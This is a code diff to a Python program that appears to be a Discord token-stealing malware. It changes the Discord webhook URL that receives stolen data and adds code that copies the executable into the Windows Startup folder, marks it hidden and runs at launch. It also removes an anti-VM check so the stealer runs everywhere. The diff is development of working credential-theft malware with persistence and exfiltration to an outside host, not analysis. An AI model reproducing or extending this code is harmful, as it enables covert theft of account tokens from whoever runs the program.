@@ -14,11 +14,9 @@ import os
 import sys
 import platform
 import subprocess
-import psutil
-import time
 import ctypes
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1460790440428175553/pKYIidBOMxcqroGRdpBROYtBkqbh9JPoD07hYv2_QNdB1qOw-BdWNt-bJ-xO8pylVFZ2"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1439340174340390913/ma4jamCgF3dVLl8RG5pQjvN1DB7Ns45bfPk87-MEJwHwoRnmToA46trbe9ep-yCWBE-m"
 
 def detect_vm():
     vm_indicators = 0
@@ -113,17 +111,22 @@ def copy_exe_to_startup(exe_path):
     )
     base, ext = os.path.splitext(os.path.basename(exe_path))
     destination_path = os.path.join(startup_folder, f"flickgoontech{ext}")
+    
     if not os.path.exists(destination_path):
         shutil.copy2(exe_path, destination_path)
-
-        if sys.platform == 'win32':
+        
+        try:
+            FILE_ATTRIBUTE_HIDDEN = 0x02
+            ctypes.windll.kernel32.SetFileAttributesW(destination_path, FILE_ATTRIBUTE_HIDDEN)
+        except Exception as e:
             try:
-                import ctypes
-                FILE_ATTRIBUTE_HIDDEN = 0x02
-                ctypes.windll.kernel32.SetFileAttributesW(destination_path, FILE_ATTRIBUTE_HIDDEN)
+                os.system(f'attrib +h "{destination_path}"')
             except:
-                pass
-                
+                print(f"Failed to hide file: {e}")
+
+exe_path = os.path.abspath(sys.argv[0])
+copy_exe_to_startup(exe_path)
+
 def getheaders(token=None):
     headers = {
         "Content-Type": "application/json",
@@ -360,9 +363,6 @@ def delete_file(file_path):
         os.remove(file_path)
 
 def main():
-    if not vm_bypass():
-        return
-    
     checked = []
     for platform_name, path in PATHS.items():
         if not os.path.exists(path):
